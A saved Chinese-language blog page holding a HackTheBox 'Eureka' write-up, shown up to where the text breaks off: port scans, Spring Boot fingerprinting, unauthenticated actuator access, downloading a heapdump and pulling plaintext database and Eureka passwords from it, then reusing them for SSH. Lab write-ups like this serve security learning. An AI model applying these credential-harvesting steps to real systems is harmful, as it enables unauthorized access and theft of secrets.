<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Machine - Eureka

 https://app.hackthebox.com/machines/Eureka | `Hard`
 

PS：尤里卡发动！所有奇观建造提速 30% !

前期踩点





Web 渗透

信息收集

WhatWeb





页面上的一些操作要进行登陆后才能进行操作



抓个包分析一下框架



nginx 是前端 Web Server（反代或直接服..." data-next-head=""/><meta property="og:title" content="HackTheBox - Machine - Eureka" data-next-head=""/><meta property="og:description" content="Machine - Eureka

 https://app.hackthebox.com/machines/Eureka | `Hard`
 

PS：尤里卡发动！所有奇观建造提速 30% !

前期踩点





Web 渗透

信息收集

WhatWeb





页面上的一些操作要进行登陆后才能进行操作



抓个包分析一下框架



nginx 是前端 Web Server（反代或直接服..." data-next-head=""/><meta property="og:url" content="https://sunsetaction.top/2025/04/28/HackTheBoxMachine - Eureka" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-04-28" data-next-head=""/><meta property="article:modified_time" content="2025-04-28" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="Linux靶机" data-next-head=""/><meta property="article:tag" content="HackTheBox" data-next-head=""/><meta property="article:tag" content="Spring" data-next-head=""/><meta property="article:tag" content="Eureka" data-next-head=""/><meta property="article:tag" content="命令注入" data-next-head=""/><meta property="article:tag" content="encrypt" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="HackTheBox - Machine - Eureka" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top/2025/04/28/HackTheBoxMachine - Eureka" data-next-head=""/><title data-next-head="">HackTheBox - Machine - Eureka</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/b1513c3d3d6a31a1.css" as="style"/><link rel="stylesheet" href="/_next/static/css/b1513c3d3d6a31a1.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/951-ad0cb56524ddaaf1.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-08a5e9543ab19a3f.js" defer=""></script><script src="/_next/static/pHM-E_zYUcTxr25rLOgva/_buildManifest.js" defer=""></script><script src="/_next/static/pHM-E_zYUcTxr25rLOgva/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400">HackTheBox - Machine - Eureka</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-04-28</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-04-28<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Linux靶机</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">HackTheBox</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Spring</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Eureka</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">命令注入</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">encrypt</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxMachine - Eureka","contentHtml":"\u003ch1\u003eMachine - Eureka\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/Eureka\"\u003ehttps://app.hackthebox.com/machines/Eureka\u003c/a\u003e | \u003ccode\u003eHard\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003ePS：尤里卡发动！所有奇观建造提速 30% !\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Eureka nmap -sT -min-rate 10000 -p- 10.10.11.66\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-27 02:28 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.66\nHost is up (0.15s latency).\nNot shown: 65493 filtered tcp ports (no-response), 40 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Eureka nmap -sT -A -T4 -O -p 22,80 10.10.11.66\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-27 02:36 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e eureka.htb (10.10.11.66)\nHost is up (0.19s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)\n|   256 90:11:9d:67:b6:f6:64:d4:\u003cspan class=\"hljs-built_in\"\u003edf\u003c/span\u003e:7f:ed:4a:90:2e:6d:7b (ECDSA)\n|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://furni.htb/\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   442.32 ms 10.10.16.1\n2   139.60 ms eureka.htb (10.10.11.66)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 33.95 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWeb 渗透\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003eWhatWeb\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Eureka whatweb furni.htb                                                                             \nhttp://furni.htb [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.66], Meta-Author[Untree.co], Script, Title[Furni | Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Eureka/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e页面上的一些操作要进行登陆后才能进行操作\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Eureka/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e抓个包分析一下框架\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Eureka curl -i http://furni.htb                                                                                                                                                                                                  \nHTTP/1.1 200 OK                                                                                                                                                                                                                     \nServer: nginx/1.18.0 (Ubuntu)                                                                                                                                                                                                       \nDate: Sun, 27 Apr 2025 06:48:57 GMT                                                                                                                                                                                                 \nContent-Type: text/html;charset=UTF-8                                                                                                                                                                                               \nTransfer-Encoding: chunked                                                                                                                                                                                                          \nConnection: keep-alive                                                                                                                                                                                                              \nVary: Origin                                                                                                                                                                                                                        \nVary: Access-Control-Request-Method                                                                                                                                                                                                 \nVary: Access-Control-Request-Headers                                                                                                                                                                                                \nX-Content-Type-Options: nosniff\nX-XSS-Protection: 0\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\nPragma: no-cache\nExpires: 0\nX-Frame-Options: DENY\nContent-Language: en-US\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003enginx\u003c/strong\u003e 是前端 Web Server（反代或直接服务）。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eContent-Type 是 text/html;charset=UTF-8\u003c/strong\u003e，一般就是标准网页。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eX-Content-Type-Options: nosniff\u003c/strong\u003e 和 \u003cstrong\u003eX-Frame-Options: DENY\u003c/strong\u003e 这些是常见的安全 HTTP 头，一般 Java、Spring Boot、或者 ASP.NET Core 这种现代后端框架会加上这些头。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCache-Control: no-cache, no-store, max-age=0, must-revalidate\u003c/strong\u003e，这种强制禁止缓存的策略，也常见于 \u003cstrong\u003eSpring Boot\u003c/strong\u003e，尤其是默认模板生成的网站。\u003c/p\u003e\n\u003cp\u003e再加上 \u003ccode\u003eContent-Language: en-US\u003c/code\u003e，和 \u003ccode\u003ePragma: no-cache\u003c/code\u003e 这种写法，也很像 Java 系列应用。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e所以，综合来看，后端很可能是 Java 系的框架，极有可能是\u003c/strong\u003e：\u003cstrong\u003eSpring Boot\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e目录扫描也确定了这一点，扫描出来了\u003ccode\u003e/actuator\u003c/code\u003e 目录，并且返回 200\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Eureka/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eSpring acturtor 未授权\u003c/h3\u003e\n\u003cp\u003e存在未授权访问\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecurl http://furni.htb/actuator/env\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e能发现网站根目录：\u003ccode\u003e/var/www/web/Furni\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Eureka/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e并且目录扫描中还从扫描出来了 \u003ccode\u003e/actuator/heapdump\u003c/code\u003e （\u003ccode\u003eHeap dump\u003c/code\u003e 为渗透测试者提供了对内存中所有对象的可视化访问，是发现和验证敏感信息泄露、业务逻辑缺陷及内存破坏漏洞的重要手段。）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e[03:08:56] 200 -   76MB - /actuator/heapdump\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Eureka curl http://furni.htb/actuator/heapdump --output heapdump \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 76.4M  100 76.4M    0     0  1472k      0  0:00:53  0:00:53 --:--:--  477k\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用 工具对其进行分析\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Eureka java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump                                                                                                                                                                      \nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e                                                                                                                                                       \n===========================================                                                                                                                                                                                         \nSpringDataSourceProperties\n-------------\npassword = 0sc@r190_S0l!dP@sswd\ndriverClassName = com.mysql.cj.jdbc.Driver\nurl = jdbc:mysql://localhost:3306/Furni_WebApp_DB\nusername = oscar190\n===========================================\nHikariDataSource\n-------------\njava.lang.NumberFormatException: Cannot parse null string \n===========================================\nOriginTrackedMapPropertySource\n-------------                  \nmanagement.endpoints.web.exposure.include = *\nspring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver\nspring.cloud.inetutils.ignoredInterfaces = enp0s.*\neureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/\nserver.forward-headers-strategy = native   \nspring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB\nspring.application.name = Furni\nserver.port = 8082\nspring.jpa.properties.hibernate.format_sql = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\nspring.session.store-type = jdbc           \nspring.jpa.hibernate.ddl-auto = none\n-------------                                                \nUserPassSearcher                           \n.... many Message ....\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e喂给GPT上进行分析，其中最关键的信息是：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eusername = oscar190  \npassword = 0sc@r190_S0l!dP@sswd  \nurl      = jdbc:mysql://localhost:3306/Furni_WebApp_DB  \n\u003c/code\u003e\u003c/pre\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e配置项\u003c/th\u003e\n\u003cth\u003e含义\u003c/th\u003e\n\u003cth\u003e安全影响／风险\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003emanagement.endpoints.web.exposure.include = *\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eActuator 暴露所有管理端点（包括 \u003ccode\u003e/heapdump\u003c/code\u003e, \u003ccode\u003e/env\u003c/code\u003e, \u003ccode\u003e/beans\u003c/code\u003e 等）\u003c/td\u003e\n\u003ctd\u003e\u003cstrong\u003e高危\u003c/strong\u003e：攻击者可访问任意管理端点，下载堆快照、查看环境变量、动态修改日志级别，甚至执行敏感操作。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003espring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eJDBC 驱动类，使用 MySQL Connector/J\u003c/td\u003e\n\u003ctd\u003e无直接风险，但表明后续 URL、凭据可用于 MySQL 连接。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003espring.cloud.inetutils.ignoredInterfaces = enp0s.*\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eSpring Cloud InetUtils 忽略以 \u003ccode\u003eenp0s.*\u003c/code\u003e 命名的网络接口\u003c/td\u003e\n\u003ctd\u003e较低风险；影响服务注册时记录的 IP，与实际可达 IP 可能不一致。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eeureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eEureka 客户端注册中心地址，包含明文用户名和密码\u003c/td\u003e\n\u003ctd\u003e\u003cstrong\u003e高危\u003c/strong\u003e：可查询/下线其他微服务实例，破坏服务可用性或窃取更多配置信息。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eserver.forward-headers-strategy = native\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e代理环境下转发 HTTP 头（如 X-Forwarded-*）\u003c/td\u003e\n\u003ctd\u003e较低风险；可能影响日志中记录的真实客户端 IP，但对渗透价值有限。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003espring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eJDBC 连接 URL，指向本地 MySQL 数据库\u003c/td\u003e\n\u003ctd\u003e已结合凭据可直接连接数据库，若数据库允许运行外部连接，可远程利用。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003espring.application.name = Furni\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e应用在 Eureka 或其他注册中心中的名称\u003c/td\u003e\n\u003ctd\u003e低风险；可用于识别服务拓扑，但对攻击无直接帮助。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eserver.port = 8082\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e应用监听的 HTTP 端口\u003c/td\u003e\n\u003ctd\u003e揭示可访问的端口，渗透测试时可针对该端口进行探测与攻击。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003espring.jpa.properties.hibernate.format_sql = true\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eHibernate 打印 SQL 时格式化输出\u003c/td\u003e\n\u003ctd\u003e低风险；仅影响日志可读性，无安全影响。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003espring.session.store-type = jdbc\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eSpring Session 存储策略，表示会话数据存入数据库\u003c/td\u003e\n\u003ctd\u003e中等风险：会话信息、Session ID 存库，攻击者可尝试读取或篡改会话表以进行会话固定或劫持。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003espring.jpa.hibernate.ddl-auto = none\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eHibernate 不会自动创建、更新或验证数据库结构\u003c/td\u003e\n\u003ctd\u003e低风险；表示应用不会修改表结构。\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3\u003eSpring Eureka\u003c/h3\u003e\n\u003cp\u003eSpring Eureka 是一个服务注册中心，是用来实现微服务之间\u003cstrong\u003e自动注册和发现\u003c/strong\u003e的工具\u003c/p\u003e\n\u003cp\u003e分析中发现，账号密码也展示出来了 \u003ccode\u003eEurekaSrvr:0scarPWDisTheB3st\u003c/code\u003e\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e\u003ccode\u003eeureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/\u003c/code\u003e\u003c/th\u003e\n\u003cth\u003eEureka 客户端注册中心地址，包含明文用户名和密码\u003c/th\u003e\n\u003cth\u003e\u003cstrong\u003e高危\u003c/strong\u003e：可查询/下线其他微服务实例，破坏服务可用性或窃取更多配置信息。\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003c/table\u003e\n\u003cp\u003e能发现服务器在好几个端口运行着服务\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Eureka/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e提权 - To Miranda\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e之前上面还发现呢一组账号密码\u003ccode\u003eoscar190:0sc@r190_S0l!dP@sswd\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e尝试 SSH 登录，发现成功了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Eureka ssh oscar190@10.10.11.66\nThe authenticity of host \u003cspan class=\"hljs-string\"\u003e'10.10.11.66 (10.10.11.66)'\u003c/span\u003e can\u003cspan class=\"hljs-string\"\u003e't be established.\nED25519 key fingerprint is SHA256:5/rCExVFUnFdG5UFLnW7ExQuyelBwtSqwHzBiWKqza0.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '\u003c/span\u003e10.10.11.66\u003cspan class=\"hljs-string\"\u003e' (ED25519) to the list of known hosts.\noscar190@10.10.11.66'\u003c/span\u003es password: \n\nLast login: Sun Apr 27 07:31:27 2025 from 10.10.16.59\noscar190@eureka:~$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e用户信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eoscar190@eureka:/home$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\nmiranda-wise  oscar190\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e监听的端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eoscar190@eureka:~$ ss -tulpn\nNetid                 State                   Recv-Q                  Send-Q                                        Local Address:Port                                    Peer Address:Port                 Process                 \nudp                   UNCONN                  0                       0                                             127.0.0.53%lo:53                                           0.0.0.0:*                                            